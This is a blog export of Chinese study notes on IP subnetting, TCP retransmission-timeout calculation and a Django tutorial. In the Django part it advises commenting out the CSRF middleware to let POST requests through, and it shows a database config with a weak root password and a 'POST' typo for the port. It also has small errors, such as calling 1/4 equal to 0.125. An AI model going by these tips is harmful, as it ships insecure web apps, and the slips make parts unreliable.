写成十进制 255.255.255.0\n也可以用&#x2F;24来表示，表示前24位是网络位，比如：192.168.5.8&#x2F;24\n子网掩码为255.255.255.255表示本网段只有1个IP地址，举例：电信运营商动态分配给用户的IP地址110.80.191.243和子网掩码255.255.255.255。\n三、划分子网的三级网络结构\n将一个大的网络划分成几个较小的子网，变成“网络位+子网位+主机位”的三级结构。\n（一）子网掩码的计算(★记住)\n10000000→128  (借1位)\n11000000→128＋64＝192  (借2位)\n11100000→128＋64＋32＝224  (借3位)\n11110000→128＋64＋32＋16＝240  (借4位)\n11111000→128＋64＋32＋16＋8＝248  (借5位)\n11111100→128＋64＋32＋16＋8＋4＝252  (借6位)\n11111110→128＋64＋32＋16＋8＋4＋2＝254  (借7位)\n11111111→128＋64＋32＋16＋8＋4＋2＋1＝255  (借8位)\n（二）子网划分计算\n向主机位借1位可以划分成2个子网，借2位划分成4个子网，借3位划分成8个子网，如下：\n28＝256，27＝128，26＝64，25＝32，24＝16，23＝8，22＝4，21＝2\n（三）举例\n举例1：172.17.0.3&#x2F;19子网掩码是多少 (借3位)\n子网掩码11111111.11111111.11100000.00000000 即255.255.224.0\n举例2：192.168.6.7&#x2F;26子网掩码是多少 (借2位)\n子网掩码11111111.11111111.11111111.11000000 即255.255.255.192\n举例3：IP地址172.16.37.95，子网掩码为255.255.224.0，写出网络地址、主机地址和广播地址。\n解答：224表示借3位，172.16.37.95→172.16.00100101.95；\n网络地址：172.16.00100000.0→172.16.32.0   (主机位全0)\n主机地址：0.0.00000101.95→0.0.5.95  (网络位全0)\n广播地址：172.16.00111111.255→172.16.63.255   (主机位全1)\n练习：写出以下IP地址的网络地址、主机地址和广播地址\n172.16.99.8&#x2F;255.255.240.0  (提示：172.16.01100011.8)\n192.168.3.72&#x2F;255.255.255.192 (提示：192.168.3.01001000)\n10.33.4.5&#x2F;255.248.0.0 (提示：10.00100001.4.5)\n192.168.56.24&#x2F;255.255.255.224\n172.17.189.98&#x2F;255.255.252.0\n11.254.255.220&#x2F;255.128.0.0\n四、考题(记住方法)\nIP地址为126.150.28.57，子网掩码为255.240.0.0，那么地址类别是（），网络地址是（），直接广播地址是（），受限广播地址是（），主机地址是（），子网内的第一个可用IP地址是（），子网内的最后一个可用IP地址是（）\n解答：\n126.150.28.57&#x2F;255.240.0.0→126.10010110.28.57\n地址类别是：A类\n网络地址是：126.144.0.0  (主机位全0)\n直接广播地址是：126.159.255.255  (主机位全1)\n受限广播地址是：255.255.255.255\n主机地址是：0.6.28.57  (网络位全0)\n子网内的第一个可用IP地址是：126.144.0.1  (网络地址+1)\n子网内的最后一个可用IP地址是：126.159.255.254  (广播地址-1)\n","slug":"标准分类的IP地址","date":"2021-06-22T06:28:00.000Z","categories_index":"学习笔记","tags_index":"计算机网络","author_index":"kif"},{"id":"e70ac243ed96ebe126ae5c93419396bc","title":"计算机网络--重传时间计算","content":"我们都知道，TCP发送方在规定时间内没有收到确认就要重传已发送的报文段（里面有一个超时计数器），这个逻辑很简单，但是这个超时计数器的值每次都是不一样的，也就是说：重传时间的选择是不一样的，它是如何确定的呢？？？\nTCP下层是互联网环境，发送的报文段可能只经过一个高速率的局域网，也可能经过多个低速率的网络，并且每个IP数据报所选择的路由还可能不同。如果把超时重传时间设置太短，就会引起很多报文段的不必要的重传，使网络负荷增大。但若把超时重传时间设置的太长，那么网络空闲时间会增大，极大的降低了网络的效率\n到底应该设置为多大呢？？？？\nTCP采用了一种自适应算法，它记录一个报文段发出的时间，以及收到相应的确认的时间。这两个时间之差就是报文段的往返时间RTT。TCP保留了RTT的一个加权平均往返时间RTTs（这又成为平滑的往返时间，S表示Smoothed。因为进行的是加权平均，因此获得的结果更加平滑，也就是让我们计算出的结果更加合理）。每回的第一次测量到RTT样本时，RTTs值就取为所测量到的RTT样本值，但以后每次测量到一个新的RTT样本，就按下面的公式重新计算一次RTTs：\n           \n在上式中：（阿尔法 的值介于0到1，若很接近0，则表示旧的RTTs值和新的RTTs值相比变化不大，也就是说，新的RTT样本不太影响RTTs; 若很接近1，则表明新的RTTs值，受当前采集的RTT样本影响较大，跟上次的RTTs差距大）\nRFC 2988：推荐的阿尔法值为1&#x2F;8,也就是0.125 （这种方式得出的值更为平滑）\n显然：超时计数器设置的超时重传时间RTO（Retransmission Time-Out）应略大于上面计算的结果。同样的：\nRFC  2988：建议使用下面的公式计算RTO：\n          \nRTTd是RTT的偏差的加权平均值，与RTTs和新的RTT样本之差有关。RFC 2988建议这样计算RTTd。当第一次测量时，RTTd值取为RTT样本值的一半。在以后的测量中，则使用下式计算加权平均RTTd：\n          \n这里的（贝塔）是一个小于1的系数，它的推荐值是1&#x2F;4，即就是0。125\n好了，通过上面这些东西：我们就可以求出超时计数器所要设置的时间问题了，但是，但是，但是，新的问题也来了？？？？\n发送一个报文段，设定的重传时间到了，还没有收到确认。于是重传报文段，经过一段时间后：收到了确认报文段。\n现在的问题是：如何判定此报文段是对先发送的报文段的确认，还是对后来重传的报文段的确认？？？由于重传的报文段和原来的报文段完全一样，所以源主机在接受到确认后，无法做出正确的判断，而正确的判断对确定加权平均RTTs的值关系很大。\n1，若收到的是对重传报文段的确认，但却被源主机当作是对原来报文段的确认，则计算出的RTTs和超时重传时间RTO就会偏大。若后面再发送的报文段又是经过重传后才收到的确认报文段，则RTO这个时间会越来越长。直接影响效率\n2，若收到的是对原来的报文段的确认，但被当作是对重传报文段的确认，则由此计算出的RTTs和RTO都会偏小，这样就会导致过多的重传，使的RTO越来越小\n根据以上所说：Karn提出了一个算法：在计算加权平均RTTs时，只要报文段重传了，就不采用其往返时间样本。这样得出的加权平均RTTs和RTO就相对比较准确了。\n但是，但是，要是出现这样的情况呢？？：报文段的时延突然增大了很多。因此在原来得出的重传时间内，不会收到确认报文段。于是就重传报文段。但根据Karn算法，不考虑重传的报文段的往返时间样本。这样：超时重传时间就无法更新。\n因此：要对Karn算法进行修正：方法是：报文段每重传一次，就把超时冲传时间RTO增大一些。典型的做法是：取新的重传时间为2倍的旧的重传时间。当不再发生报文段的重传时，才根据上面给出公式计算超时重传时间。。。。\n转自;https://blog.csdn.net/msdnwolaile/article/details/51227491\n","slug":"计算机网络-重传时间计算","date":"2021-06-22T05:48:00.000Z","categories_index":"学习笔记","tags_index":"计算机网络","author_index":"kif"},{"id":"1c5e4adfa32051d3ce39d99767de062e","title":"后端框架学习-Django","content":"基本介绍Django 是一个由 Python 编写的一个开放源代码的 Web 应用框架。\n使用 Django，只要很少的代码，Python 的程序开发人员就可以轻松地完成一个正式网站所需要的大部分内容，并进一步开发出全功能的 Web 服务 Django 本身基于 MVC 模型，即 Model（模型）+ View（视图）+ Controller（控制器）设计模式，MVC 模式使后续对程序的修改和扩展简化，并且使程序某一部分的重复利用成为可能。\nMVC 优势：\n\n低耦合\n开发快捷\n部署方便\n可重用性高\n维护成本低\n…\n\nPython 加 Django 是快速开发、设计、部署网站的最佳组合。\n特点\n强大的数据库功能\n自带强大的后台功能\n优雅的网址\n\n\nMVC 与 MTV模型MVC 模型MVC 模式（Model–view–controller）是软件工程中的一种软件架构模式，把软件系统分为三个基本部分：模型（Model）、视图（View）和控制器（Controller）。\nMVC 以一种插件式的、松耦合的方式连接在一起。\n\n模型（M）- 编写程序应有的功能，负责业务对象与数据库的映射(ORM)。\n视图（V）- 图形界面，负责与用户的交互(页面)。\n控制器（C）- 负责转发请求，对请求进行处理。\n\n简易图：\n\n用户操作流程图：\n\n\nMTV 模型Django 的 MTV 模式本质上和 MVC 是一样的，也是为了各组件间保持松耦合关系，只是定义上有些许不同，Django 的 MTV 分别是指：\n\nM 表示模型（Model）：编写程序应有的功能，负责业务对象与数据库的映射(ORM)。\nT 表示模板 (Template)：负责如何把页面(html)展示给用户。\nV 表示视图（View）：负责业务逻辑，并在适当时候调用 Model和 Template。\n\n除了以上三层之外，还需要一个 URL 分发器，它的作用是将一个个 URL 的页面请求分发给不同的 View 处理，View 再调用相应的 Model 和 Template，MTV 的响应模式如下所示：\n简易图：\n\n用户操作流程图：\n\n解析：\n用户通过浏览器向我们的服务器发起一个请求(request)，这个请求会去访问视图函数：\n\na.如果不涉及到数据调用，那么这个时候视图函数直接返回一个模板也就是一个网页给用户。\nb.如果涉及到数据调用，那么视图函数调用模型，模型去数据库查找数据，然后逐级返回。\n\n视图函数把返回的数据填充到模板中空格中，最后返回网页给用户。\n创建项目使用命令行创建项目django-admin startproject 项目名称\n\n使用 Pycharm 创建项目\nfile ---&gt; new project ---- 选择Django ---&gt; 配置路径和项目名称 ---&gt; 配置环境(默认用系统环境) ----&gt; 点击create(完成创建)\n\n\n项目目录介绍\n|---mysite # 项目的&#x2F;目录 \n  |---mysite # 项目目录 \n      |---__init__.py \n      |---settings.py # 配置文件 \n      |---urls.py # 路由系统 &#x3D;&#x3D;&#x3D;&gt; url与视图的对应关系 \n      |---wsgi.py # runserver命令就使用wsgiref模块做简单的web server \n|---manage.py # 管理文件\n\n\n创建应用\n使用命令行模式创建应用\n在 Terminal 中输入 python manage.py startapp 应用名:\n\n\n使用 Pycharm 创建应用\n\n注意：使用命令行创建的应用，一定要在 settings.py–&gt;INSTALLED_APPS 中加入你的应用名字进行注册, 使用Pycharm创建的应用则不用。 认识应用结构\n\n运行项目\n使用命令行运行项目：\npython3 manage.py runserver \nmanage.py runserver 80      # 指定端口\n\n注意：要在 manage.py 同级目录执行命令。\n\n\nPycharm 启动项目\n点击右上角的绿色的三角按钮。\n如需更改配置信息，请下拉选择 edit configurations，进行配置。\n\n\n配置完以上信息之后，直接按 Ctrl+shift+F10 运行一下 manage.py 文件。\n出现如下结果，表示配置成功。\n\n创建项目django-admin startproject + 项目名称\n启动服务（测试用，前台启动）python3 manage.py runserver (+端口号&#x2F;default:8000)python3 manage.py runserver 0.0.0.0:8000\n关闭服务在终端crtl+csudo lsof -i:8000 -&gt;kill -9ubuntu\n启动应用python manage.py startapp\n列出所有的命令python3 manage.py\n生成数据库迁移文件python manage.py makemigrations\n执行数据库迁移python manage.py migrate\n进入 Django Shellpython manage.py shell\n创建adminpython manage.py createsuperuser\n清理已过期Sessionspython manage.py clearsessions\n生成requirements.txt；\n\n\n\n\n\n\n\n\npip freeze &gt; requirements.txt\n创建内存表python manage.py createcachetable\nmanage.py 包含项目管理的子命令项目同名文件夹init:python包的初始化文件wsgi.py:WEB网关的配置文件，正式启动django时才需要用到urls.py:项目主路由配置-HTTP请求进入Django，有限调用settings.py:项目的配置文件-包含项目启动需要的配置。\nsettings.py\n公有配置和自定义配置\n配置项格式例： BASE_DIR &#x3D; ‘xxxx’\n公有配置：Django官方提供的基础配置\n自定义配置满足命名规则，并尽量个性化\n\n项目的绝对路径\n\n\n\n\n\n\n\n\n\nBASE_DIR &#x3D; Path(file).resolve().parent.parent\n启动模式：True调试模式：\n\n检测代码改动后，立即重启服务\n报错后提供一个\n\nFalse正式启动模式、上线模式\n\n\n\n\n\n\n\n\n\nDEBUG &#x3D; True\n请求Host头,只处理请求头在在列表中的请求，过滤一些请求，debug &#x3D; 1在调试模式下默认接收127.0.0.1和localhost两个值。局域网内部访问时需要把局域网IP加上，一旦不为空就必须都配置上\n\n\n\n\n\n\n\n\n\nALLOWED_HOSTS &#x3D; []\n主路由文件位置：\n\n\n\n\n\n\n\n\n\nROOT_URLCONF &#x3D; ‘hworld.urls’\n语言配置：\n\n\n\n\n\n\n\n\n\nLANGUAGE_CODE &#x3D; ‘en-us’（zh-Hans）\n时区：\n\n\n\n\n\n\n\n\n\nTIME_ZONE &#x3D; ‘UTC’（Asia&#x2F;Shanghai）\nURL统一资源定位符（Uniform Resource Locator）\n\n\n\n\n\n\n\n\n\nprotocal(协议)：&#x2F;&#x2F;hostname(主机)[:port(端口)]&#x2F;path(路由)[?query(查询字符串)][#fragment(锚点)]\n\n协议http；https（加密，安全的https）；file，本地磁盘协议（file：&#x2F;&#x2F;&#x2F;）\nhostname:依靠DNS解析为IP\n端口：默认http为80端口\n路由地址\n查询字符串：？menuld&#x3D;634898&amp;version&#x3D;AID9089  主要用于给动态网页传递参数，样式：？参数&#x3D;值&amp;参数&#x3D;值\n信息片段：#subject锚点，直接定位到网页指定位置\n\nDjango如何处理URL?1.从配置文件中根据ROOT_URLCONF找到主路由文件，默认urls.py2.加载urlpatterns变量[包含很多数组的路由]3.依次匹配urlspatterns的path，匹配到第一个合适的中断后续匹配4.匹配成功-返回响应5.匹配失败-返回404\n视图函数用于接收浏览器请求并通过HttpResponse对象返回响应的函数。此函数可以接收浏览器请求并根据业务逻辑返回相应的响应内容给浏览器。语法：\ndef xxx_view(request[,其他参数…])：\n    return HttpResponse对象\n\n书写位置：项目同名文件夹下&#x2F;views.py\nfrom django.http import HttpResponse\ndef page1_view(request):\n    html = '&lt;h1>这是一个页面&lt;/h1>'\n    return HttpResponse(html)\n\n路由配置\n\n\n\n\n\n\n\n\npath函数from django.urls import pathpath(route,views,name &#x3D; None)\n\nroute:字符串类型，匹配的请求路径\nviews：指定路径所处理的视图处理函数的名称\nname：地址别名\n\npath转化器\n\n\n\n\n\n\n\n\n\npath转换器&lt;转换器类型:自定义名&gt;作用：若转换器类型匹配到对应类型的数据，则将数据按照关键字传参的方式传递给视图函数\n\n\n\n\n\n\n\n\n\npath(‘page&#x2F;int:page‘,views.xxx)\n转换器：\n\nstr：匹配除了’&#x2F;‘之外的非空字符串\nint：int匹配0或任何正整数\nslug：匹配任何由ASCII字母或数字以及连字符和下划线组成的短标签\npath：匹配非空字段，包括路径分隔符‘&#x2F;’\n\nre_path函数：正则匹配，更加精密的匹配规则re_path(reg,view,name &#x3D; xx)正则表达式为命名分组模式(?Ppattern);\nHTTP请求1.请求：浏览器通过HTTP协议发送给服务器端的数据2.响应：服务器端接收到请求后做相应的处理后再回复给浏览器端的数据。\n起始行：方法、路由、协议\n\nheaders：请求头 K:V\n\n请求体(body)：可能为空\n\n\n请求方法：\nGET：返回实体主体\nHEAD:调试获取报头\nPOST：向指定资源提交数据进行处理\nPUT：更新\nDELETE：删除\nCONNECT:代理服务器\nOPTIONS\nTRACE：回显，主要用于测试和诊断\n\n\n\nDjango中的请求：实际就是视图函数的第一个参数，及HttpRequest对象个人理解就是Django预先将请求转变为了对象，将请求内容转变为对象属性。说到底是对报文进行了预处理。\n\npath_info:URL字符串\nmethod：表示HTTP请求方法\nGET：拿查询字符串（？后的值），QueryDict查询字典的对象\nPOST：拿POST表单里的数据，即用户提交的数据，QueryDict查询字典的对象\nFILES：类似于字典的对象，拿文件\nCOOKIES\nsession\nbody\nscheme\nget_full_path()\nMETA:请求头\n\n请求&#x2F;响应起始行（协议版本 状态码）\n响应头(K:V)\n响应体body\n\n响应状态码：\n\n200 请求成功\n500 内部服务器错误\n301 永久重定向\n302 临时重定向\n404 请求的资源不存在\n\n分类：\n\n1**，收到请求，需要继续执行操作\n2**，成功，操作被成功接收并处理\n3**，重定向\n4**，客户端错误\n5**，服务器错误\n\nDjango的响应对象\n\n\n\n\n\n\n\n\n\nHttpResponse(content &#x3D; 响应体，content_type &#x3D; 响应体数据类型default：html，status &#x3D; 状态码，default：200)作用：向客户端浏览器返回响应，同时携带响应体内容。\n常用Content_Type\n\n‘test&#x2F;html’  ……\n\nGET请求和POST请求统一由视图函数接收，因此一定是需要隔离业务逻辑\nif request.method == 'GET':\n    处理GET业务逻辑\nelif request.method =='POST':\n    处理POST的业务逻辑\nelse:\n    其他业务逻辑\n````\n\n**GET处理：**\n一般用于向服务器获取数据。\n能够产生GET请求的场景：\n\n+ 浏览器地址栏输入URL并回车\n+ &lt;a href = \"地址？参数=值&amp;参数=值\"\\>\n+ form表单中的method为get\n\nGET请求方法中，如果有数据需要传递给服务器，通常会使用查询字符串传递。【注意不要传递敏感数据】\nURL:http://127.0.0.1:8000/page1\\?a=100&amp;b=200\n服务器端接收参数\n获取客户端请求GET请求提交的数据：\n\n```python\nrequest.GET['参数名']\nrequest.GET.get('参数名','默认值')\nrequest.GET.getlist('参数名')\n\n如果有传递多个值，则参数对应的应该是一个列表，需要使用getlist方法取出所有值，get方法只能取出最后一个值。应用场景：问卷调查的复选框\nPOST处理一般用于向服务器提交大量&#x2F;隐私数据通过表单\n&lt;form method = 'post' action = '/login'>\n    姓名：&lt;input type = 'text' name = 'username'>\n    &lt;input type = 'submit' value = '登录'>\n&lt;/form>\n\nCSRF验证问题本身是django的防御措施，防御CSRF攻击问题，会阻止POST，暂时关闭：settings.py》注释django.middleware.csrf.CsrfViewMiddleware\nDjango的设计模式传统的MVC Mode-View-Controller（模型-视图-控制器）模式。特点：低耦合\n\nM模型层：主要用于对数据库层的封装\nV视图层：用于给用户展示结果（WHAT + HOW显示什么，怎么显示）\nC控制层：用于处理请求、获取数据、返回结果\n\nDjango：MTV模式把MVC的V拆成了两层，并且弱化C层为路由文件。\n\nM模型层：与MVC相同\nT模板层：Template，专门负责html相关事情（HOW）\nV视图层：核心，负责接收请求，获得结果，返回结果。  在该模式下依然存在控制层C，即主路由\n\nDjango模板层模板层创建模板：根据字典数据动态变化的html网页，根据视图中传递的字典数据动态生成相应的html页面模板配置：\n\n创建模板文件夹 &lt;项目名&gt;&#x2F;templates\n在settings.py中TEMPLATE配置项\nBACKEND：指定模板引擎\nDIRS：模板的搜索目录（可以是一个或多个）\nAPP_DIRS：是否在应用中的templates文件夹中搜索末班文件\nOPTIONS：有关模板的选项\n\n\n主要需要修改的：DIRS：  ‘DIRS’:[os.path.join(BASE_DIR,’templates’)]\n\n模板加载方案1：\nfrom django.template import loader\n1.通过loader加载模板\nt = loader.get_template(\"模板文件名\")\n2.将t转化为HTML字符串\nhtml = t.render(字典数据)\n3.用响应对象将转换的字符串内容返回给浏览器\nreturn HttpResponse(html)\n\n模板加载方案2：使用render直接加载并且响应模板。在视图函数中\nfrom django.shortcuts import render\nreturn render(request,'模板文件名',字典数据)\n\n视图层与模板层之间的交互\n\n视图函数中可以将Python变量封装到字典中传递到模板中。\n\ndef xxx_view(request):\n    dic = &#123;\n        k1: v1,\n        k2: v2\n    &#125;\n    return render(request, 'xxx.html', dic)\n\n\n模板中使用的语法来调用视图传进来的变量。\n\n模板的变量能传递到模板中的变量类型：str,int,list,tuple,dict,func,obj\n在模板中使用变量的语法：\n\n\n\n\n\n\n\n模板层的标签作用：将一些服务器端的功能嵌入到模板中，例如流程控制等\n语法\n&#123;% 标签 %&#125;\n…\n&#123;% 结束标签 %&#125;\n\n例：if标签\n&#123;% if 条件表达式 1 %&#125;\n…\n&#123;% elif 条件表达式 2 %&#125;\n…\n&#123;% elif 条件表达式 3 %&#125;\n…\n&#123;% else %&#125;\n…\n&#123;% endif %&#125;#！！一定记住要封口\n\nNOTICE!在模板中使用实际括号是无效的语法，如果需要指示优先级，则应该选择嵌套if\nfor标签语法\n&#123;% for 变量 in 可迭代对象 %&#125;\n    …循环语句\n&#123;% empty %&#125;\n    …可迭代对象无数据时填充语句\n&#123;% endfor %&#125;\n\n内置变量forloopforloop.counter:循环的当前迭代（从1开始索引）forloop.counter0:循环的当前迭代（从0开始索引）forloop.revcounter:counter倒序forloop.revcounter0:counter0倒序forloop.first:第一次循环为真‘forloop.last：最后一次循环为真forloop.parentloop：外层循环\n模板层过滤器过滤器：在变量输出时对变量的值进行处理可以通过使用过滤器来改变变量的输出显示\n语法：\n&#123;&#123;变量|过滤器1：&#39;参数1&#39;|过滤器2：&#39;参数值2&#39;…&#125;&#125;\n\n常用过滤器：\n\nlower：转换为小写\nupper：转换为大写\nsafe：魔人布对变量内的字符串进行html转义\nadd：将value的值增加n\n\n模板的继承模板继承使父模板内容重用，子模板直接继承父模板的全部内容并可以覆盖父模板中相应的块。\n语法——父模板中：\n\n定义父模板中的块block标签\n识别出哪些在子模板是允许被修改的\nblock标签：在父模板中定义，在子模板中覆盖\n\n语法——子模板中：\n\n继承模板extends标签（写在模板第一行）  例如\n  &#123;%extend &#39;base.html&#39;&#125;\n\n子模板 复写父模板中的内容块\n  &#123;block block_name&#125;\n&#123;% endblock blockname %&#125;\n\n重写的覆盖规则\n\n不重写，按照父模板的效果显示\n重写，则按照重写效果显示  注意：\n模板继承时，服务器的动态内容无法继承\n\nurl反向解析代码中url的位置：1.模板\n\n超链接&lt;a href &#x3D; &gt;\nform表单 form action 将表单中的数据用POST的方法提交到url\n\n2.视图函数中 - 302跳转 HttpResponseRedirect(‘url’)将用户地址栏中的地址跳转到url\n代码中的url书写规范\n\n1.绝对地址：http://127.0.0.1:8000/page/\n2.相对地址：\na ‘&#x2F;page&#x2F;1&#x2F;‘浏览器会把当前地址栏的协议、IP和端口加上这个地址\nb ‘page&#x2F;1&#x2F;‘没有&#x2F;开头的，浏览器会根据当前url最后一个&#x2F;之前的内容加上该相对地址作为最终访问地址\n\n\n\nurl反向解析指在视图或模板中，用path定义的别名来动态查找或计算出相应的路由。path：\n\npath(route,views,name&#x3D;’别名’)\n\n模板中：\n&#123;% url &#39;别名&#39;%&#125;\n&#123;% url &#39;别名&#39; &#39;参数值1&#39; &#39;参数值2&#39;%&#125;\n\n视图函数中调用reverse方法进行方向解析\nfrom django.urls import reverse\nreverse('别名', args=[], kwargs=&#123;&#125;)\n\nex:print(reverse(‘pagen’,args&#x3D;[300]))print(reverse(‘person’,kwargs&#x3D;{‘name’:’xixi’,’age’:18}))\n静态文件什么是静态文件：图片、css、js、音频、视频静态文件属于静态请求，不经过视图函数静态文件配置-settings.py\n\n1.静态文件的访问路径，默认’&#x2F;static&#x2F;‘\n2.STATICFILES_DIRS，静态文件在服务器端的存储位置  元组\n\nSTATICFILES_DIRS &#x3D; （\n        os.path.join(BASE_DIR, &quot;static&quot;),\n）\n\n\n3.方案2通过\n  &#123;% static %&#125;\n\n  标签访问静态文件\n\n1.加载static-\n&#123;% load static %&#125;\n\n\n\n2.使用静态资源-\n&#123;% static&#39;静态资源路径&#39; %&#125;\n\n\n\n3.样例：\n\n\n  &lt;img src&#x3D;&quot;&#123;% static &#39;images&#x2F;lena.jpg&#39; %&#125;&quot;&gt;\n\n应用应用创建每一个应用都是一个MTV创建应用\n\n用manage.py执行startapp\n\n\n\n\n\n\n\n\n\n\npython manage.py startapp music\n\n在settings.py的INSTALLED_APPS列表中配置安装此应用\n\n执行创建应用后，应用文件夹下\n\nmigrations文件夹：与DB有关\ninit.py\nadmin.py\napps.py\nmodels.py:与DB相关\ntests.py\nviews.py：视图函数\n\n分布式路由Django中，主路由配置文件可以不处理用户具体路由，主路由配置文件的可以做请求的分发（分布式请求处理）。具体的请求可以由各自的应用来进行处理。主路由匹配前缀，如&#x2F;news&#x2F;，再往下分发到子路由配置。配置分布式路由：\n\n主路由中调用include函数\n\nhttp:&#x2F;&#x2F;127.0.0.1:8000&#x2F;music&#x2F;index -&gt; path(&#39;music&#x2F;&#39;,include(&#39;music.urls&#39;))\n\n\n在子路由下创建urls.py，其内部结构与主路由完全一致。  path(‘index&#x2F;‘, views.index_view)\n\n应用下的模板应用内部可以配置模板目录\n\n1.应用下手动创建templates文件夹\n2.settings.py中开启应用模板功能\n\n\n\n\n\n\n\n\n\n\nTEMPLATE配置项中的’APP_DIRS’值为True即可、\nimportant：查找模板的顺序：外层templates文件夹-&gt;注册顺序的app内部的templates文件夹解决方法：在应用层的templates下创建嵌套同名子目录，从而在views.py render中使得html获得不一样的路径\n模型层及ORM介绍模型层：负责与数据库之间进行通信Django配置mysql\n\n创建数据库mysql\n更改settings.py：\n\nDATABASES = &#123;\n    'default': &#123;\n        'ENGINE': 'django.db.backends.mysql',\n        'NAME': 'mysite3',\n        'USER': 'root',\n        'PASSWORD': '123456',\n        'HOST': '127.0.0.1',\n        'POST': '3306'\n    &#125;\n\n什么是模型：\n\n模型是一个Python的类，它是由django.db.models.Model派生出的子类。\n一个模型类代表数据库的一张数据表\n模型类中每一个类属性都代表数据库中的一个字段\n模型是数据交互的接口，是表示和操作数据库的方法和方式。\n\nORM框架ORM（对象关系映射），是一种程序技术，能够使用类和对象对数据库进行操作，从而避免通过SQL语句操作数据库。\n作用\n\n建立模型类和表之间的对应关系，允许我们通过面向对象的方式来操作数据库。\n根据设计的模型类生成数据库中的表格。\n通过简单的配置就能更换数据库引擎。\n\n优点：\n\n只需要面向对象编程，简化了向数据库编写代码的流程。\n实现了数据模型与数据库的解耦，屏蔽了不同数据库操作上的差异。\n\n缺点：\n\n对于复杂业务，使用成本较高\n根据对象的操作转换为SQL语句，根据查询结果转化为对象，在映射过程中有性能损失。\n\n映射图：ORM———-&gt;DB类———-&gt;数据表对象——–&gt;数据行属性——–&gt;字段\n数据库迁移：迁移是Django同步您对模型所做出的更改（添加字段，删除模型等）到您的数据库模式的方式。\n\n1.生成迁移文件：\n\n\n\n\n\n\n\n\n\n\npython manage.py makemigrations生成一个中间文件，并保存在migrations文件夹中\n\n2.执行迁移脚本程序\n\n\n\n\n\n\n\n\n\n\npython manage.py migrate执行迁移程序实现迁移，将每个应用下的migrations目录中的中间文件同步回数据库。\n模型类模型类-创建\nfrom django.db import models\nclass 模型类名(models.Model):\n    字段名 = models.字段类型（字段选项）\n\n表名实际为 APP名称+类名称小写\n模型类-字段类型：\nBooleanField  数据库类型：tinyint(1)  编程语言中将使用True或False来表示值  在数据库中则使用0或1来表示具体的值\n\nChar  数据库类型：VarChar（Django不支持Char）  注意：必须要指定max_length参数值\n\nDataField()  数据库类型：date  作用：表示日期  参数：三选一+ auto_now:每次保存对象时，自动设置该字段为当前时间（取值：True&#x2F;False）+ auto_now_add:当兑现第一次被创建时自动设置当前时间（取值：True&#x2F;False）+ default:设置当前时间\n\nDataTimeField()  数据库类型：datatime(6)通常用这个，比上面那个精确一些  作用：表示日期和时间  参数：同DataField\n\nFloatField()  数据库类型：double  编程语言中和数据库中都使用小数表示值\n\nDecimalField()  数据库类型：decimal(x,y)  编程语言中:使用小数表示该列的值  在数据库中：使用小数  参数（必须有）：max_digits;decimal_places\n\nEmailField()  数据库类型：varchar  编程语言和数据库中均使用字符串，但Django含有正则检查。\n\nIntegerField()  数据库类型：Int  编程语言和数据库中使用整数\n\nImageField()  数据库类型：varchar(100)  作用：在数据库中为了保存图片路径  编程语言和数据库中使用字符串\n\nTextField()  数据库类型：longtext  作用：表示不定长的字符数据\n\n\n模型类-字段选项：创建列的额外信息\n\nprimary_key：设置为True，则为主键，此数据库表不会创建id字段\nblank:设置为True，则字段可以为空，控制的是Admin后台的提交，和mysql的null不同\nnull：设置为True，则该列允许为空  默认为False,需要一个default选项来设置默认值\ndefault：设置该列的默认值\ndb_index：设置为True，表示为该列增加索引\nunique: 唯一索引\ndb_column：指定列的名称，如果不指定的话则采用属性名作为列名。不给的话字段名就是列名。\nverbose_name：设置此字段在admin界面上的显示名称，可以中文化admin界面\n\n好习惯：字段选项【添加或更改】均要执行\n模型类-Meta内部类使用Meta类来给**模型(其实就是表的属性)**赋予属性，Meta类下有很多内建的类属性，可对模型类做一些控制。如改表名：\nfrom django.db import models\nclass 模型类名(models.Model):\n    字段名 = models.字段类型（字段选项）\n    class Meta:\n        db_table = 'book'\n        #控制模型类在admin后台显示的名称\n        verbose_name = '单数名'\n        #指定复数形态\n        verbose_name_plural = '复数名'\n\n\nDjango对于数据库操作是惰性的，尽量不对数据库进行积极的修改，如设置的default值将不参与表的字段生成，只会参与实际插值。\nORM-创建数据增删改查ORM CRUD核心：模型类.管理器对象\n管理器对象每一个models.Model的模型类，都会有一个objects对象被同样继承下来，这个对象叫做管理器对象。数据库的增删改查可以通过管理器实现。\n创建数据方案1：\n\nMyModel.objects.create(属性1&#x3D;值1，属性2&#x3D;值2,…)\n\n成功：返回创建好的实体对象失败：抛出异常\n方案2：\n\n创建MyModel实例对象，并调用save()并保存\n\nobj = Mymodel(属性 = 值，属性 = 值)\nobj.属性 = 值\nobj.save()\n\n需要使用Django Shell\n\n\n\n\n\n\n\n\n\npython manage.py shell代码每次变化，都需要重启Django Shell\nORM查询操作通过管理器对象进行通过MyModel.objects管理器方法调用查询方法方法\n\nall()  用法：MyModel.objects.all()  等价于select * from table  返回值：QuerySet容器对象，类数组对象，内部存放了MyModel实例  如\n\n&lt;QuerySet [&lt;Book: Python,20.00&gt;, &lt;Book: jango,50.00&gt;, &lt;Book: JQuery,40.00&gt;, &lt;Book: Linux,30.00&gt;, &lt;Book: HTML5,26.00&gt;]&gt;\n\n可以在模型类中定义__str__方法，自定义QuerySet中的输出格式，则输出时能输出格式化字符串。\nDjango 同样支持方法的串联，以下方法在返回QuerySet后均可使用方法串联，且最终都会按照SQL顺序对数据库进行操作。\nprint(QuerySet.query)将取得实际的SQL语句。\n\nvalues(‘字段1’,’字段2’)  等价于select 列1，列2 from xxx  返回：QuerySet，但内部存字典，每一个字典代表一个数据  如：\n\n&lt;QuerySet [&#123;&#39;title&#39;: &#39;HTML5&#39;&#125;, &#123;&#39;title&#39;: &#39;jango&#39;&#125;, &#123;&#39;title&#39;: &#39;JQuery&#39;&#125;, &#123;&#39;title&#39;: &#39;Linux&#39;&#125;, &#123;&#39;title&#39;: &#39;Python&#39;&#125;]&gt;\n\n\nvalues_list(‘字段1’,’字段2’)  基本同上，但返回元组，使用时需要使用索引\n\n&lt;QuerySet [(&#39;HTML5&#39;,), (&#39;jango&#39;,), (&#39;JQuery&#39;,), (&#39;Linux&#39;,), (&#39;Python&#39;,)]&gt;\n\n\norder_by(‘-列’(降序),’列’)  等价于 ORDER BY  返回：QuerySet  如：\n\n&lt;QuerySet [&lt;Book: jango,50.00&gt;, &lt;Book: JQuery,40.00&gt;, &lt;Book: Linux,30.00&gt;, &lt;Book: HTML5,26.00&gt;, &lt;Book: Python,20.00&gt;]&gt;\n\n\nfilter(条件)  语法：MyModel.objects.filter(属性1&#x3D;值1，属性2&#x3D;值2)（,默认是AND查询）  等价于 条件查询  